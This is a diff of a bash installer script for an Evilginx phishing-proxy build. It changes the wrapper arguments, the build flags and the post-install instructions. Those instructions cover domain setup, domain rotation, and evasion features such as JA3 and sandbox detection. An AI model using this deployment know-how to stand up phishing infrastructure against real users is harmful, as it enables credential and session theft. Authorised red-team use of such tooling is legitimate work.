@@ -1211,7 +1211,7 @@ _install_data_files() {
     log_info "Creating system-wide wrapper script..."
     cat > /usr/local/bin/evilginx << WRAPEOF
 #!/bin/bash
-exec $INSTALL_BASE/evilginx.bin -p $INSTALL_BASE/phishlets -t $INSTALL_BASE/redirectors "\$@"
+exec $INSTALL_BASE/evilginx.bin -p $INSTALL_BASE/phishlets -t $INSTALL_BASE/redirectors -u $INSTALL_BASE/post_redirectors "\$@"
 WRAPEOF
     chmod +x /usr/local/bin/evilginx
 
@@ -1220,10 +1220,7 @@ WRAPEOF
     chmod -R 755 "$INSTALL_BASE/phishlets" 2>/dev/null || true
 
     log_info "Copying documentation to $INSTALL_BASE..."
-    for docfile in README.md DEPLOYMENT.md LICENSE; do
-        [[ -f "$BUILD_DIR/$docfile" ]] && cp "$BUILD_DIR/$docfile" "$INSTALL_BASE/" || true
-    done
-    for docfile in DOMAIN-ROTATION-GUIDE.md cloudflare-workers-deployment.md; do
+    for docfile in README.md LICENSE; do
         [[ -f "$BUILD_DIR/$docfile" ]] && cp "$BUILD_DIR/$docfile" "$INSTALL_BASE/" || true
     done
 
@@ -1270,7 +1267,10 @@ build_evilginx() {
         # go build does not create the output directory — must exist first
         mkdir -p build
         local BUILD_START=$SECONDS
-        CGO_ENABLED=1 /usr/local/go/bin/go build -mod=vendor -v -o build/evilginx main.go 2>&1 | while IFS= read -r line; do
+        local _ver; _ver=$(git describe --tags --abbrev=0 2>/dev/null || echo "dev")
+        local _commit; _commit=$(git rev-parse --short HEAD 2>/dev/null || echo "unknown")
+        local _ldflags="-X github.com/kgretzky/evilginx2/core.VERSION=${_ver} -X github.com/kgretzky/evilginx2/core.COMMIT=${_commit}"
+        CGO_ENABLED=1 /usr/local/go/bin/go build -mod=vendor -ldflags "${_ldflags}" -v -o build/evilginx main.go 2>&1 | while IFS= read -r line; do
             # Show package names as they compile
             printf "\r\033[K  ${BLUE}⟳${NC} Compiling: %s" "$line"
         done
@@ -1879,7 +1879,7 @@ display_completion() {
     echo "   Run: evilginx-console"
     echo ""
     echo "2. In the Evilginx console, configure:"
-    echo "   domains set yourdomain.com"
+    echo "   config domain yourdomain.com"
     echo "   config ipv4 external <YOUR_SERVER_IP>"
     echo "   config autocert on"
     echo ""
@@ -1894,7 +1894,7 @@ display_completion() {
     echo "5. (Optional) Set up domain rotation:"
     echo "   domains add yourdomain2.com"
     echo "   domains rotation enable on"
-    echo "   See: /opt/evilginx/DOMAIN-ROTATION-GUIDE.md"
+    echo "   See: https://github.com/0fukuAkz/Evilginx3"
     echo ""
     echo "6. Exit console (Ctrl+C) and start service:"
     echo "   evilginx-start"
@@ -1906,13 +1906,11 @@ display_completion() {
     echo "  • Configure Cloudflare DNS for your domain"
     echo "  • Enable advanced features (ML, JA3, Sandbox detection)"
     echo "  • Set up Telegram notifications for monitoring"
-    echo "  • Review DEPLOYMENT.md for complete setup"
+    echo "  • Review README.md for complete setup"
     echo "  • Check logs regularly: journalctl -u evilginx -f"
     echo ""
     
     echo -e "${GREEN}Documentation:${NC}"
-    echo "  • Deployment Guide:     /opt/evilginx/DEPLOYMENT.md"
-    echo "  • Domain Rotation:      /opt/evilginx/DOMAIN-ROTATION-GUIDE.md"
     echo "  • README:               /opt/evilginx/README.md"
     echo ""
     
